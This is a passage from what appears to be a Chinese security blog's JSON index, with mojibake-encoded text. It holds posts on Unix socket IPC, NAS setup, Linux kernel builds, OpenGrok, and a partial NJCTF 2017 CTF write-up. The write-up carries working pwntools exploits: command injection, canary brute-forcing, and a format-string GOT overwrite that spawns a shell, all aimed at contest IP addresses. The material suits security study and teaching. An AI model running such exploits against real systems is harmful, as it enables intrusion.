&lt;stddef.h&gt;#define SERVER_NAME &quot;@server_socket&quot;//#define SERVER_NAME &quot;/tmp/server_socket&quot;int main(){ int sockfd; socklen_t len; struct sockaddr_un address; int result; char ch = 'A'; //create socket sockfd = socket(AF_UNIX, SOCK_STREAM, 0); address.sun_family = AF_UNIX; strcpy(address.sun_path, SERVER_NAME); address.sun_path[0]=0; len = strlen(SERVER_NAME) + offsetof(struct sockaddr_un, sun_path); result = connect(sockfd, (struct sockaddr*)&amp;address, len); if(result == -1) { perror(&quot;opps:client1&quot;); exit(1); } //communicate with server socket while(1) { printf(&quot;set send content:&quot;); scanf(&quot;%c&quot;,&amp;ch); write(sockfd, &amp;ch, 1); printf(&quot;send to server:%c \\n&quot;,ch); read(sockfd, &amp;ch, 1); printf(&quot;read from server: %c\\n&quot;, ch); } exit(0);} æ•ˆæœå¦‚ä¸‹ 1234567891011121314$ ./server server waiting...read from client 4: aserver waiting...read from client 4: server waiting...read from client 4: Zserver waiting...read from client 4: server waiting... 12345678910111213141516$ ./client set send content:asend to server:a read from server: bset send content:send to server: read from server: set send content:Zsend to server:Z read from server: [set send content:send to server: read from server: set send content: æœåŠ¡ç«¯æŠŠå®¢æˆ·ç«¯å‘æ¥çš„å­—ç¬¦åŠ ä¸€åé€å›äº†ã€‚ 0x03 å…³äºåº”ç”¨æ—¢ç„¶æ˜¯è¿›ç¨‹é—´çš„é€šä¿¡ï¼Œé‚£ä¹ˆçˆ¶å­è¿›ç¨‹ä¹‹é—´é€šä¿¡ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨è¿™ä¸ªä¸œè¥¿çš„ã€‚ é‚£è¿™ä¸ªä¸œè¥¿å°±å¯ä»¥ç”¨æ¥åšä¸€ä¸ªwapperï¼Œèµ›æ£ä»¬éƒ½æ‡‚çš„ 2333333 æˆ–è€…å¯ä»¥ç”¨æ¥åšç®€å•çš„fuzzï¼Œå­è¿›ç¨‹é‡Œå¯åŠ¨ç›®æ ‡ç¨‹åºï¼Œç„¶åäº¤äº’æ•°æ®éƒ½æ˜¯é€šè¿‡socketä¼ é€’ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠä¸€äº›è¾“å…¥å˜å¼‚ä¹‹åå†é€è¿‡å»å§ï¼Œè€Œä¸”å¼‚å¸¸æ•è·ä¹ŸæŒºå¥½åšï¼Œwaitpidå°±å¯ä»¥ã€‚ä¸è¿‡ç”¨æ¥åšfuzzerçš„è¯ï¼Œæ•ˆç‡ä¸çŸ¥é“æ€ä¹ˆæ ·â€¦ 0x04 ä»£ç é¦–å…ˆåˆ›å»ºå¥—æ¥å­—ï¼Œç„¶åforkäº§ç”Ÿå­è¿›ç¨‹ 123456789int pid;unlink(SOCK_NAME);int s = socket(AF_UNIX, SOCK_STREAM, 0);struct sockaddr_un addr;memcpy(addr.sun_path, SOCK_PATH, strlen(SOCK_PATH));addr.sun_family = AF_UNIX;bind(s, (struct sockaddr *)&amp;addr, strlen(addr.sun_path) + sizeof(addr.sun_family));listen(s, 5);pid = fork(); çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å¯åŠ¨çš„ç›®æ ‡ç¨‹åºäº¤äº’ï¼Œå¯ä»¥åŠ«æŒè¾“å…¥è¾“å‡ºã€‚ 1234567891011121314151617181920212223struct sockaddr_un child;int clen = sizeof(child);int cs = accept(s, (struct sockaddr *) &amp;child, &amp;clen);if (cs == -1) { fprintf(stderr, &quot;server socket fail\\n&quot;); exit(0);}n = read(cs, buf, BUFSIZE);write(1, buf, n);while (1) { // åœ¨è¿™é‡Œå¯ä»¥åŠ«æŒè¾“å…¥ n = read(0, buf, BUFSIZE); write(cs, buf, n); bzero(buf, BUFSIZE); // åŠ«æŒè¾“å‡º n = read(cs, buf, BUFSIZE); write(1, buf, n);} å­è¿›ç¨‹é‡Œå¯åŠ¨ç›®æ ‡ç¨‹åº 12345678910111213int s = socket(AF_UNIX, SOCK_STREAM, 0);struct sockaddr_un addr;bzero(addr.sun_path, sizeof(addr.sun_path));memcpy(addr.sun_path, SOCK_PATH, strlen(SOCK_PATH));addr.sun_family = AF_UNIX;connect(s, (struct sockaddr *)&amp;addr, strlen(addr.sun_path) + sizeof(addr.sun_family));if (s == -1) { fprintf(stderr, &quot;cli socket fail\\n&quot;); exit(0);}dup2(s, 0);dup2(s, 1);execve(&quot;./target&quot;, NULL, NULL); 0x05 å‚è€ƒmanpagelinux socketè¿›ç¨‹é—´é€šä¿¡","link":"/2017/01/30/Linux%20socket%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8F%8A%E5%BA%94%E7%94%A8/"},{"title":"NASæŠ˜è…¾è®°å½•","text":"å…³äº å¤§æ¦‚äº”æœˆçš„æ—¶å€™ä¸¢å¤±äº†ä¸€æ³¢æ•°æ®ï¼Œå¤§æ¦‚ä¸åˆ°2TBï¼Œè™½ç„¶æœ€åæ•‘å›æ¥äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä»ç„¶è®©æˆ‘å¿ƒæœ‰ä½™æ‚¸ï¼Œç”Ÿæ€•è¿™æ ·çš„æƒ…å†µå†æ¬¡å‘ç”Ÿï¼Œç´¢æ€§ç”³è¯·èµ„é‡‘ä¹°NASï¼Œç”±äºæœ¬èº«åˆä¸æŠ˜è…¾ç¡¬ä»¶ä»€ä¹ˆçš„ï¼Œå°±ç›´æ¥ä¸€æ­¥åˆ°ä½é€‰æ‹©äº†ç¾¤æ™–DS218+ï¼ŒåŒç›˜ä½ï¼Œx86ï¼Œå¤ŸæŠ˜è…¾äº†ã€‚ å› ä¸ºæ˜¯ä¸¤ç›˜ä½ï¼Œæ‰€ä»¥å°½é‡ç¡¬ç›˜é€‰æ‹©çš„å¤§ä¸€ç‚¹ï¼Œä¸ç„¶åç»­ç½®æ¢å¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨è‚¯å®šæ˜¯è¦åšraidçš„ï¼Œæˆ‘è¿™é‡Œç›´æ¥ä¹°äº†ä¸¤å—å¸Œæ·çš„8Tä¼ä¸šç›˜ï¼Œè‚‰ç–¼æ˜¯è‚¯å®šçš„ï¼Œä½†æ˜¯æ¢æ¥çš„æ˜¯å¤§å®¹é‡+å®‰å…¨æ€§ï¼Œæ‰€ä»¥è¿˜æ˜¯ç‰©æœ‰æ‰€å€¼ï¼›æœ€åè¿˜ç»™NASåŠ äº†ä¸€æ¡å†…å­˜ï¼Œæ–¹ä¾¿åé¢æŠ˜è…¾dockerã€‚ å¥—ä»¶&amp;&amp;Docker æˆ‘æœ¬èº«ä½¿ç”¨NASå°±æ˜¯ä¸ºäº†æ•°æ®å¤‡ä»½ï¼Œæ‰€ä»¥ç¾¤æ™–æä¾›çš„å¥—ä»¶è¿˜æ˜¯ååˆ†å®ç”¨ï¼Œæœ‰ç§ä¹°è½¯ä»¶é€NASçš„æ„Ÿè§‰ï¼Œæ‰‹æœºç›¸å†Œç›´æ¥ä½¿ç”¨Monmentså¤‡ä»½äº†ï¼Œmacå¯ä»¥tmå¤‡ä»½ä¸Šå»ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯ä¸“é—¨å‡†å¤‡äº†ä¸€å—2tçš„ç§»åŠ¨ç¡¬ç›˜ç»™macåštmå¤‡ä»½ï¼Œé‡è¦çš„æ–‡ä»¶ä¼šé€‰æ‹©å¤šå¤„å¤‡ä»½ï¼Œç›´æ¥ç”¨äº†ç¾¤æ™–çš„Synology Driveç»™åŒæ­¥åˆ°äº†NASä¸Šï¼Œå½“ç„¶è¿™äº›éƒ½æ¯”è¾ƒç®€å•åŸºç¡€ã€‚ ä¸ºäº†éšæ—¶èƒ½è¿ä¸Šnasä½¿ç”¨ï¼Œç¾¤æ™–è™½ç„¶æä¾›äº†quick connectï¼Œä½†æ˜¯æ¶‰åŠåˆ°NASä¸Šè·‘ç€çš„ä¸€äº›dockerçš„æ—¶å€™ï¼Œè¿™æ ·å°±å¾ˆä¸æ–¹ä¾¿äº†ï¼›æ‰€ä»¥æˆ‘æ‰¾è”é€šå¼€äº†å…¬ç½‘ipï¼Œç„¶åNASè®¾ç½®é‡Œå¼€äº†DDNSï¼Œç„¶åå¯ä»¥ç”¨ç¾¤æ™–æä¾›çš„åŸŸåç›´æ¥æ¥è®¿é—®è‡ªå·±çš„NASäº†ï¼Œä¸è¿‡ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘å¼€äº†ä¸€äº›å®‰å…¨ç­–ç•¥ä»¥åŠbanæ‰äº†éå¿…é¡»ç«¯å£ï¼Œå¹¶ä¸”å¼€äº†SSLã€‚ åœ¨æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥å¼€å§‹é€ ä½œäº†ï¼Œæˆ‘æŠ˜è…¾çš„æ¯”è¾ƒå¤šçš„æ˜¯dockerï¼š gitea snell docker(for proxy) Aria2 Ubuntu &amp;&amp; mongodb ä¸ºäº†ä¸æš´éœ²å¤ªå¤šç«¯å£å‡ºæ¥ï¼ˆgiteaçš„ï¼Œubuntuçš„å•¥çš„ï¼‰ï¼Œæˆ‘çš„è®¾æƒ³æ˜¯åªæš´éœ²ä¸€ä¸ªä»£ç†çš„ç«¯å£ï¼Œç„¶åæˆ‘è¿ä¸Šä»£ç†ï¼Œå…¶ä»–çš„å®¹å™¨é€šè¿‡ä»£ç†æœ¬åœ°è®¿é—®ï¼Œè¿™æ ·èƒ½æœ€å¤§é™åº¦å‡å°‘é£é™©ï¼Œä»£ç†çš„è¯ä¹Ÿä¸é€‰ç”¨å¸¸ç”¨çš„ï¼Œæˆ–è€…è¯´è‡ªå·±åšä¸€äº›ä¿®æ”¹ã€‚ è‡ªå·±æä¸ªgitç”¨çœŸèˆ’æœå•Šï¼Œgitlabå¤ªé‡äº†ï¼Œä¸ªäººä½¿ç”¨çš„è¯æ²¡å¿…è¦ï¼Œgiteaæ¯”è¾ƒè½»é‡çº§ï¼ŒçœŸé¦™ã€‚ æ€»ä¹‹è¿™è¿˜æ˜¯è›®é¦™çš„ï¼Œé…ç½®å¥½aria2åï¼Œä¸‹ç”µå½±å†ç»“åˆç¾¤æ™–çš„Video Station å®¶åº­å½±é™¢åˆ†åˆ†é’Ÿæèµ·ï¼Œè¿˜èƒ½éšæ—¶éšåœ°å­¦ä¹ ï¼ŒçœŸé¦™ ğŸ˜„","link":"/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"},{"title":"NJCTF-2017éƒ¨åˆ†wp","text":"0x00:åªåšäº†å‡ ä¸ªå¾ˆæ°´çš„é¢˜ç›®â€¦æˆ‘å¥½èœå•Š 0x01:re300æ‰¾åˆ°äº†åŸé¢˜â€¦ç›´æ¥ç”¨è„šæœ¬è§£çš„ 123456789101112131415161718from itertools import cycleimport subprocessdef xor(s1, s2, enc_add): return ''.join(chr(ord(a) ^ ord(b) ^ enc_add) for a,b in zip(cycle(s1), s2))keys = [str(x)*3 for x in range(1, 500)]# pull the encoded stuff out of the program's outputout, _ = subprocess.Popen(['./re300'], stdout=subprocess.PIPE).communicate()hex_enc = out.split('\\n')[0].split()[-1]enc = hex_enc.decode('hex')for key in keys: enc_add = len(enc) &amp; 0xFF; enc = xor(key, enc, enc_add)print enc å¾—åˆ°NJCTF{2c3010644150e03b6630a0b3b7f8607b} 0x02:vsvsè„‘æ´â€¦æ•°å­—22æ˜¯çˆ†ç ´æ¥çš„ï¼Œç„¶åå°±ä¸çŸ¥é“å¹²å•¥äº†ï¼Œçè„‘æ´å‘ç°å¯ä»¥è¶³å¤Ÿé•¿çš„bufferä¹‹åçš„å­—ç¬¦ä¸²ä¼šè¢«å½“æˆå‘½ä»¤æ‰§è¡Œ(nameé‚£é‡Œ) 1234567891011121314151617181920212223242526272829303132333435from pwn import *#context.log_level = 'debug'#context.arch=''def login(p,code): p.recvuntil('code:') p.sendline(str(code))def handle(p,input,name): p.recvuntil('input:') p.sendline(str(input)) p.recvuntil('name?') p.sendline(str(name))def main(): length = 1024 ''' while True: p = remote('218.2.197.235',23749) login(p,22) payload = &quot;a&quot; * length + 'ls' handle(p,'muhe',payload) length += 1 p.close() ''' p = remote('218.2.197.235',23749) login(p,22) payload = &quot;a&quot; * length + 'cat&lt;flag' handle(p,'muhe',payload) print p.recvline()if __name__ == '__main__': main() 0x03:pwn200æ ˆæº¢å‡ºç®€å•ç²—æš´ï¼Œä¸è¿‡éœ€è¦æš´åŠ›çŒœè§£canaryï¼Œç„¶åç›´æ¥retåˆ°send flagçš„å‡½æ•°é‚£é‡Œï¼ŒæŠŠflagè¯»å›æ¥ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = 'debug'context.arch = 'amd64'LOCAL = False'''if LOCAL: p = process('filename')else: p = remote('127.0.0.1',5555)'''def crack_canary(): canary = &quot;\\x00&quot; while True: if len(canary) == 8: break for item in range(0xff): canary_tmp = canary + chr(item) try: r = remote('218.2.197.234', 2090) #r = remote('127.0.0.1',5555) r.recvuntil(&quot;Welcome!\\n&quot;) payload = &quot;A&quot;*(0x70-8) payload += canary_tmp r.send(payload) data = r.recv(100,timeout=1) if &quot;Message received!&quot; in data: canary += chr(item) log.info(&quot;get:{0}&quot;.format(hex(item))) break r.close() except: continue #raw_input(&quot;now,stop&quot;) log.info(&quot;[*] canary:{0}&quot;.format(hex(u64(canary)))) return canarydef main(): #canary_local = 0x977e4ba376461900 canary = 0x9dccf42e364dcf00 payload = &quot;a&quot; *(0x70-0x8) + p64(canary) + &quot;aaaaaaaa&quot;+p64(0x0000000000400BC6) r = remote('218.2.197.234', 2090) r.recvuntil(&quot;Welcome!\\n&quot;) r.send(payload) print r.recvline(1024,timeout=0.5) r.close()if __name__ == '__main__': main() 0x04 : pwn300(æœªåšå‡º)æ— binæ–‡ä»¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ¢æµ‹ä¹‹åå‘ç°æ—¶x86çš„ç¨‹åºã€‚é¦–å…ˆdump fileå§ï¼Œç„¶åleak gotï¼ŒæŸ¥libcï¼Œç¡®å®šsystemï¼Œç›´æ¥æ”¹äº†printfçš„gotå»get shellã€‚æ¯”èµ›çš„æ—¶å€™offsetä¸€ç›´æŸ¥ä¸åˆ°â€¦å°±ggäº†ï¼Œåæ¥jokerå¸ˆå‚…çš„libcåº“è´¼å…¨ï¼Œç»™äº†æˆ‘offsetã€‚(æˆ‘ä¸€å®šå¥½å¥½æ”¶é›†libcâ€¦) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level = 'debug'context.arch = 'i386'LOCAL = Falseif LOCAL: p = process('filename')else: p = remote('218.2.197.235',23745) #p = remote('127.0.0.1',10001)setbuf_got = 0x08049970printf_got = 0x08049974puts_got = 0x08049980fgets_got = 0x08049978strchar_got= 0x08049984def info_leak(addr,length=0): payload = &quot;BBBB&quot; + &quot;%9$s&quot; + p32(addr) + &quot;AAAA&quot; p.sendline(payload) p.recvuntil('BBBB') data = u32(p.recv(4)) return datadef exp(offset): p.recvuntil('me') #fucking info leak work... data = info_leak(setbuf_got) log.info(&quot;puts:{0}&quot;.format(hex(data))) data = info_leak(fgets_got) log.info(&quot;setbuf:{0}&quot;.format(hex(data))) data = info_leak(fgets_got) log.info(&quot;fgets:{0}&quot;.format(hex(data))) data = info_leak(strchar_got) log.info(&quot;strchr:{0}&quot;.format(hex(data))) #printf_got = 0x08049974 #local data = info_leak(printf_got) log.info(&quot;printf:{0}&quot;.format(hex(data))) #local_offset = 59600 system_addr = data - offset log.info(&quot;system:{0}&quot;.format(hex(system_addr))) write = system_addr &amp; 0xffffff two = write&amp;0xffff one = (write&gt;&gt;16)&amp;0xff payload = p32(printf_got+2) payload += p32(printf_got) payload += &quot;%{0}c%7$hhn%{1}c%8$hn&quot;.format(one-8,two-one) p.sendline(payload) p.sendline(&quot;/bin/sh&quot;) p.interactive()def main(): remote_offset = 0xe6e0 exp(remote_offset)if __name__ == '__main__': main() 0x05: mobile100-safeboxæš´åŠ›è·‘testAndroidé‡Œçš„checké€»è¾‘ï¼Œå¯ä»¥å¾—åˆ°ä¸¤ç»„è§£ï¼Œåªæœ‰ä¸€ç»„ç¬¦åˆè¦æ±‚ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839package com.muhe;import javafx.beans.property.IntegerProperty;import java.util.ArrayList;public class Main { public static void main(String[] args) { String flag = &quot;NJCTF{have&quot;; int num1 = 48533584; System.out.println(flag + (((char)(num1 / 1000000))) + (((char)(num1 / 10000 % 100))) + (((char)(num1 / 100 % 100+10))) + &quot;f4n}&quot;); num1 = 48539584; System.out.println(flag + (((char) (num1 / 1000000))) + (((char) (num1 / 10000 % 100))) + (((char) (num1 / 100 % 100 + 10))) + &quot;f4n}&quot;); Crack ck = new Crack(); ArrayList list = new ArrayList(); int num = 10000000; while (true){ if(num&gt;99999999){ break; } boolean ret = ck.crack(num); if(ret){ list.add(num); } num += 1; } System.out.println(&quot;Done&quot;); for(int i = 0;i&lt;list.size();i++){ System.out.println(list.get(i)); } }} 123456789101112131415161718192021222324252627282930313233343536package com.muhe;/** * Created by muhe on 2017/3/11. */public class Crack { public boolean crack(int v4) { int v11 = 3; if(v4 &gt; 10000000 &amp;&amp; v4 &lt; 99999999) { int v7 = 1; int v8 = 10000000; int v3 = 1; if(Math.abs(v4 / 1000 % 100 - 36) == v11 &amp;&amp; v4 % 1000 % 584 == 0) { int v5 = 0; while(v5 &lt; v11) { if(v4 / v7 % 10 != v4 / v8 % 10) { v3 = 0; } else { v7 *= 10; v8 /= 10; ++v5; continue; } break; } if(v3 != 1) { return false; } return true; } } return false; }} å¾—åˆ°ç»“æœ 12345NJCTF{have05-f4n}NJCTF{have05if4n} //è¿™ä¸ªå°±æ˜¯flagDone4853358448539584","link":"/2017/03/15/NJCTF-2017%E9%83%A8%E5%88%86wp/"},{"title":"Linux Kernel ç¼–è¯‘è¸©å‘","text":"env configubuntu 18.04 amd64 gcc-8works on ubuntu 16.04 and 18.04 1234sudo add-apt-repository ppa:ubuntu-toolchain-r/testsudo apt-get updatesudo apt-get install gcc-8 g++-8gcc-8 --version clang123456789R=348261svn co -r $R http://llvm.org/svn/llvm-project/llvm/trunk llvmcd llvm(cd tools &amp;&amp; svn co -r $R http://llvm.org/svn/llvm-project/cfe/trunk clang)(cd projects &amp;&amp; svn co -r $R http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)mkdir llvm_cmake_build &amp;&amp; cd llvm_cmake_buildcmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../make -j64 clangexport KMSAN_CLANG_PATH=`pwd`/bin/clang æ–‡æ¡£é‡Œ-j64çœŸçš„å¥¢åâ€¦ qemu kvmè¿™éƒ¨åˆ†æ¨èæ‰‹åŠ¨ç¼–è¯‘æœ€æ–°ç‰ˆæœ¬/è¾ƒæ–°ç‰ˆæœ¬ï¼Œç›´æ¥aptå®‰è£…çš„ç‰ˆæœ¬æœ‰ç‚¹è€ï¼Œåé¢å¯èƒ½æœ‰å½±å“ã€‚ åŸºæœ¬æ²¡å•¥å‘ï¼Œå°±æ˜¯è€—æ—¶è€—åŠ› :( build kernelmainline123make menuconfigcp path/to/config .configmake bzImage -j2 linux-nextä¸€æ ·çš„ç¼–è¯‘è¿‡ç¨‹ï¼Œnextåªæ˜¯ä»£ç æ¯”è¾ƒæ¿€è¿›çš„ç‰ˆæœ¬ 123make menuconfigcp path/to/config .configmake bzImage -j2 kmsanè·Ÿç€readmeèµ°å°±è¡Œäº† é‡åˆ°ä¸€ä¸ªå‘ç‚¹ï¼Œ 123export KMSAN_CLANG_PATH=`pwd`/bin/clang...make CC=$KMSAN_CLANG_PATH -j64 -k 2&gt;&amp;1 | tee build.log ç›´æ¥è¿™ä¹ˆç¼–è¯‘æœ‰é—®é¢˜ï¼Œè¯•äº†å‡ æ¬¡éƒ½ä¸è¡Œï¼Œæç¤ºè¯´ç¼–è¯‘å™¨ä¸æ”¯æŒxxxxè¿™ç±»é—®é¢˜ã€‚æœ€åæˆ‘å°è¯•äº†: 1export CC=/path/to/clang ä¹‹åç›´æ¥ç¼–è¯‘å°±æ²¡é—®é¢˜äº† 1make bzImage -j2 è¿™ä¸ªç‰ˆæœ¬æˆ‘åé¢å¼„äº†ä¸ªæ›´æ–°ç‰ˆæœ¬çš„clangä¹Ÿå¯ä»¥ç›´æ¥ç¼–è¯‘è¿‡ã€‚ ktsanç¼–è¯‘æ²¡å•¥å‘ï¼Œå°±æ˜¯æ³¨æ„.configæ–‡ä»¶åˆ«ä¹±æ”¹ã€‚ 1234567git clone https://github.com/google/ktsan.gitcd ktsan/make defconfigmake kvmconfigscripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFOyes '' | make oldconfigmake -j2 LOCALVERSION=-tsan run kernelåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ 123456789IMG=qemu-image.imgDIR=mount-point.dirqemu-img create $IMG 10gmkfs.ext2 $IMGmkdir $DIRsudo mount -o loop $IMG $DIRsudo debootstrap --arch amd64 jessie $DIRsudo umount $DIRrmdir $DIR è¿™æ ·ç›´æ¥åˆ›å»ºä¸è¡Œï¼Œéœ€è¦åœ¨å–æ¶ˆæŒ‚è½½ä¹‹å‰è®¾ç½®å¥½æ–°æ–‡ä»¶ç³»ç»Ÿé‡Œçš„ç”¨æˆ·åå¯†ç ã€‚ 1sudo chroot mount-point.dir /bin/bash è¿›å»ä¹‹åï¼Œç›´æ¥ä¿®æ”¹rootå¯†ç å°±è¡Œäº† 1# passwd root å…¶å®è¿˜èƒ½åšå…¶ä»–çš„è®¾ç½®ï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†éªŒè¯åŠ è½½çš„å†…æ ¸æ˜¯å¦æ­£å¸¸ï¼Œåªéœ€è¦ç™»å½•è¿›å»å°±okäº†ã€‚ åŸºæœ¬ä¸Šéƒ½èƒ½ç”¨è¿™ä¸ªå‘½ä»¤èµ·æ¥ 1234567sudo qemu-system-x86_64 \\-enable-kvm \\-m 2G -smp 2 \\-hda qemu-image.img \\-kernel linux-5.4-rc4/arch/x86/boot/bzImage \\-append &quot;debug root=/dev/sda console=ttyS0&quot; \\-nographic é™¤äº†ktsan 1234567qemu-system-x86_64 \\ -drive file=qemu-image.img,index=0 \\ -m 24G -smp 4 \\ -net user,hostfwd=tcp::10022-:22 -net nic \\ -nographic \\ -kernel arch/x86/boot/bzImage -append &quot;console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ&quot;\\ -enable-kvm -cpu host æˆ‘ç”¨å®ƒwikié‡Œçš„å‘½ä»¤æ— æ³•æˆåŠŸå¯åŠ¨ï¼Œå„ç§panicï¼Œæˆ–è€…å°±æ˜¯æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å‡ºé—®é¢˜ï¼Œæˆ‘æ¢äº†æˆ‘åŸæœ¬çš„ext2çš„imgä¹‹åå¤šè¯•å‡ æ¬¡ï¼Œå°±èƒ½æ­£å¸¸å·¥ä½œäº†ã€‚ æˆ‘è¿™é‡Œç»™çš„æ˜¯24Gå†…å­˜ã€‚ referencektsankmsanlinux-kernel","link":"/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"},{"title":"OpenGrokæ­å»º","text":"0x00: èµ·å› å·¥ä½œç¯å¢ƒæ¢åˆ°äº†macä¹‹åå¾ˆå¤šä¸œè¥¿éƒ½ä¸ä¸€æ ·äº†ã€‚æœ€è¿‘åœ¨çœ‹Linux kernelå‡ ä¸ªæ¼æ´ï¼Œéœ€è¦é˜…è¯»Linuxæºç ï¼Œç„¶è€Œåœ¨windowsä¸Šä½¿ç”¨ä¹ æƒ¯äº†source insightåï¼ŒmacOSä¸Šä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“å•¥å·¥å…·å¥½ä½¿ã€‚äº†è§£åˆ°OpenGrokä¹‹åï¼Œå†³å®šæ­å»ºä¸€ä¸ªï¼Œä¸»è¦æ˜¯æ·»åŠ æºç æ–¹ä¾¿ï¼Œä¹Ÿæ–¹ä¾¿å®ç”¨ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚ å…¶å®vimæˆ–è€…sublè¿™ç±»ç¼–è¾‘å™¨çœ‹æºç ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯æˆ‘è¿˜æ²¡ä¹ æƒ¯ã€‚æ‰€ä»¥å°±å…ˆOpenGrokå•¦ï½ 0x01: å‡†å¤‡å·¥ä½œæ ¹æ®githubä¸Šé¡¹ç›®çš„wikiå¯çŸ¥ï¼Œéœ€è¦çš„å‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š JDK 1.8 or higher {OpenGrok binaries from https://github.com/OpenGrok/OpenGrok/releases (either the package for Solaris, or .tar.gz with binaries, NOT the src !) Exuberant Ctags for analysis (https://github.com/universal-ctags is recommended) A servlet container like GlassFish or Tomcat (8.x or later) also running with java at least 1.8 If history is needed, appropriate binary (in some cases also cvs/svn repository) must be present on the system (e.g. Subversion or Mercurial or SCCS or â€¦ ) 2GB of memory for indexing process using OpenGrok script (can use less, this is scaled for bigger deployments) a recent browser for clients - IE, Firefox, recent Chrome or Safarisufficient ULIMIT settings (refer to README) æˆ‘åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ­å»ºçš„ï¼Œç³»ç»Ÿæ˜¯ubuntuï¼Œåœ¨å®‰è£…äº†jdk8ä¹‹åï¼Œå»ä¸‹è½½äº†tomcatå’Œopengrokçš„åŒ…ã€‚è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œä½¿ç”¨apt-getæ–¹å¼å®‰è£…çš„tomcat8å¾ˆå¥‡æ€ªï¼ŒæœåŠ¡èµ·æ¥äº†ï¼Œä½†æ˜¯curlè®¿é—®æœ¬åœ°8080çš„æ—¶å€™ï¼Œæ²¡å›åº”ï¼Œæ‰€ä»¥æˆ‘æœ€åå»å®˜ç½‘ä¸‹è½½äº†ä¸€ä¸ªtomcatçš„åŒ…ã€‚ 0x02ï¼šè¿‡ç¨‹å¦‚æœæ˜¯å¾ˆå¤šäººç”¨ï¼Œæ¨èä¸“é—¨åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œåšå¥½æƒé™çš„éš”ç¦»ï¼Œä¸ªäººä½¿ç”¨çš„è¯æ— æ‰€è°“äº†ã€‚ å‡†å¤‡å·¥ä½œ æ‰¾ä¸€ä¸ªç›®å½•ï¼ŒæŠŠä¸‹è½½æ¥çš„tomcatå’Œopengrokè§£å‹äº†ã€‚ å¯åŠ¨tomcatï¼Œç„¶åè®¿é—®http://127.0.0.1:8080ï¼Œç¡®å®štomcatæ­£å¸¸å·¥ä½œã€‚ 1ubuntu@VM-64-163-ubuntu:~$ ./apache-tomcat-8.5.16/bin/startup.sh ä¸ºé¡¹ç›®åˆ›å»ºç›®å½•ï¼Œæ‹¿æˆ‘è‡ªå·±çš„ä¸¾ä¾‹å­ï¼š 1path/to/your/opengrok_projects/prj1 ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 123path/to/your/opengrok_projects/prj1 |-----/prj2 |-----/prj3 éƒ¨ç½²opengrok éƒ¨ç½² 1OPENGROK_TOMCAT_BASE=path/to/apache-tomcat path/to/opengrok/bin/OpenGrok deploy åˆ›å»ºç´¢å¼• 1OPENGROK_VERBOSE=true OPENGROK_INSTANCE_BASE=./opengrok_data ./opengrok-1.1-rc5/bin/OpenGrok index ./opengrok_projects åˆ›å»ºç´¢å¼•æ—¶ï¼Œä¼šåˆ›å»ºä¸‰ä¸ªç›®å½•ï¼Œä¸€ä¸ªdataç›®å½•æ¥å­˜æ”¾ç´¢å¼•ä¿¡æ¯ï¼Œä¸€ä¸ªetcç›®å½•åˆ›å»ºé…ç½®ä¿¡æ¯å’Œä¸€ä¸ªlogç›®å½•ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶ åœ¨path/to/apache-tomcat/webapps/source/WEB-INFç›®å½•ä¸‹çš„web.xmlæ–‡ä»¶ æŠŠ 12345&lt;context-param&gt; &lt;param-name&gt;CONFIGURATION&lt;/param-name&gt; &lt;param-value&gt;/var/opengrok/etc/configuration.xml&lt;/param-value&gt; &lt;description&gt;Full path to the configuration file where OpenGrok can read it's configuration&lt;/description&gt; &lt;/context-param&gt; ä¸­çš„/var/opengrok/etc/configuration.xmlä¿®æ”¹æˆå¯¹åº”çš„opengrokçš„path/to/opengrok/data/etc/configuration.xml 12345&lt;context-param&gt; &lt;description&gt;Full path to the configuration file where OpenGrok can read its configuration&lt;/description&gt; &lt;param-name&gt;CONFIGURATION&lt;/param-name&gt; &lt;param-value&gt;/home/ubuntu/opengrok_data/etc/configuration.xml&lt;/param-value&gt;&lt;/context-param&gt; æˆ‘è¿™é‡Œæ˜¯è¿™ä¸ªæ ·å­çš„ã€‚ æŠŠæºç æ”¾è¿›projectç›®å½• æˆ‘è¿™é‡Œæ”¾çš„æ˜¯linux-3.18.1çš„æºç ã€‚ä»¥åå¦‚æœæƒ³æ›´æ–°çš„è¯ï¼Œç›´æ¥æ”¾è¿›å»ï¼Œç„¶åé‡æ–°ç”Ÿæˆç´¢å¼•å°±å¥½äº†ã€‚ 0x03:æ•ˆæœ 0x04:å‚è€ƒwiki OpenGrokå®‰è£…ä½¿ç”¨æŒ‡å—","link":"/2017/07/05/OpenGrok%E6%90%AD%E5%BB%BA/"},{"title":"PlaidCTF 2016 